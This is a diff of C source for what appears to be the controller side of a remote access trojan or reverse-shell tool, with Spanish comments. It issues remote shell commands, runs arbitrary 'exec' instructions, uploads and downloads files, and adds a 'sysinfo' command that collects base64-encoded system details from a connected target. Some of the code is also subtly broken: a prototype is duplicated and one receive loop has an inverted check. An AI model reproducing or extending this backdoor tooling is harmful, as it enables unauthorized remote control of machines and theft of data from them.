@@ -35,15 +35,18 @@ const char *GRAY = "\033[0;37m\033[1m";
 int mainFunction(int targetConn, char *clientIP, uint16_t clientPort);
 int ReadAndSendFile(int targetConn, char *file, char *instruct);
 int shell(int targetConn, char *clientIP, uint16_t clientPort);
-int sndAndExecCmd(int targetConn, char *command, char *resp);
 int downloadFunc(char *command, int targetConn, char *ip); 
 int writeAndDecodeData(char *data, char *file, char *ip);
+int sndAndExecCmd(int targetConn, char *command);
 int startServer();
 void closeConection(int targetConn, char *command, size_t instructLen, char *clientIP, uint16_t clientPort);
+void StartGetSysInfo(int targetConn, char *command);
+void StartGetSysInfo(int targetConn, char *command);
 void StartSending(int targetConn, char *instruct);
 void checkStart(char *IPAddress);
 void ctrlCHandler(int sig);
 void helpPannel();
+char* decodeSystemInformation(char *codedSysInfo);
 
 void ctrlCHandler(int sig) {
     // Exit ctrl + c 
@@ -136,11 +139,12 @@ int ReadAndSendFile(int targetConn, char *file, char *instruct){
     fclose(ptr); 
     sleep(0.3);
     send(targetConn, "end\0", strlen("end\0"), 0); 
-    printf("\n\t%s[*>] %sFile Uploaded Successfully.\n\n", YELLOW,BLUE);
+    printf("\n\t%s[*>] %sFile Uploaded Successfully.\n\n", YELLOW, BLUE);
     return 0;
 }
 
-int sndAndExecCmd(int targetConn, char *command, char *resp){
+int sndAndExecCmd(int targetConn, char *command){
+    char resp[SOCKBUFFER];
     // Enviar comando
     send(targetConn, command, strlen(command), 0);
     
@@ -155,10 +159,14 @@ int sndAndExecCmd(int targetConn, char *command, char *resp){
 
         }
     }
+    memset(resp, 0, SOCKBUFFER);
     return 0;
 }
 
 int shell(int targetConn, char *clientIP, uint16_t clientPort){
+    printf("\n\t%s[*>] %sEntering Shell Mode%s\n\n", YELLOW, BLUE, end);
+    send(targetConn, "shell", strlen("shell"), 0);
+
     char command[255] = "";
     char resp[SOCKBUFFER];
     while (true) {
@@ -186,7 +194,7 @@ int shell(int targetConn, char *clientIP, uint16_t clientPort){
             continue;
             //send(targetConn, ":", sizeof(command), 0); 
         } else{
-            sndAndExecCmd(targetConn, command, resp);
+            sndAndExecCmd(targetConn, command);
         }
     }    
     return 0;
@@ -271,6 +279,34 @@ int downloadFunc(char *command, int targetConn, char *ip){
     return 0;
 }
 
+char* getSystemInformation(int targetConn, char *command){
+    send(targetConn, command, strlen(command), 0);
+    char* recvData = malloc(SOCKBUFFER);
+
+    while (true){
+        recv(targetConn, recvData, SOCKBUFFER, 0);
+        if (strstr(recvData, "end\0") == 0)
+            break;
+        else 
+            printf("%s", recvData);
+            continue;
+        
+    }
+
+    return recvData;
+}
+
+char* decodeSystemInformation(char *codedSysInfo){
+    char* decodedSystemInfo = base64_decode(codedSysInfo);
+    return decodedSystemInfo;
+}
+
+void StartGetSysInfo(int targetConn, char *command){
+    char *codedSysInfo = getSystemInformation(targetConn, command);
+    printf("%s\n", decodeSystemInformation(codedSysInfo));
+
+}
+
 int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
     char command[255] = "";
     char resp[SOCKBUFFER];
@@ -295,31 +331,28 @@ int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
 
         } else {
             // Panel de ayuda
-            if (strcmp(command, "help") == 0 || strcmp(command, "h") == 0){
+            if (strcmp(command, "help") == 0){
                 helpPannel(); 
 
             // Descargar un archivo    
-            } else if (strstr(command, "download") != NULL){
+            } else if (strstr(command, "download") != NULL)
                 downloadFunc(command, targetConn, clientIP);
-                continue;
             
-            // 
-            } else if (strcmp(command, "shell") == 0){
-                printf("\n\t%s[*>] %sEntering Shell Mode%s\n\n", YELLOW, BLUE, end);
-                send(targetConn, "shell", strlen("shell"), 0);
+            else if (strcmp(command, "shell") == 0)
                 shell(targetConn, clientIP, clientPort);
             
-            } else if (strstr(command, "exec") != NULL){
-                char resp[SOCKBUFFER];
-                sndAndExecCmd(targetConn, command, resp);
-                memset(resp, 0, SOCKBUFFER);
-            
-            }  else if(strstr(command, "upload") != NULL){
-                StartSending(targetConn, command);
+            else if (strstr(command, "exec") != NULL)
+                sndAndExecCmd(targetConn, command);
                 
-            } else {
+            else if(strstr(command, "upload") != NULL)
+                StartSending(targetConn, command);
+
+            else if(strcmp(command, "sysinfo") == 0)
+                StartGetSysInfo(targetConn, command);
+                
+            else 
                 printf("\n\t%s[!>]%s Instruct Not Known...\n", RED, YELLOW);
-            }
+            
         }
     }
 }
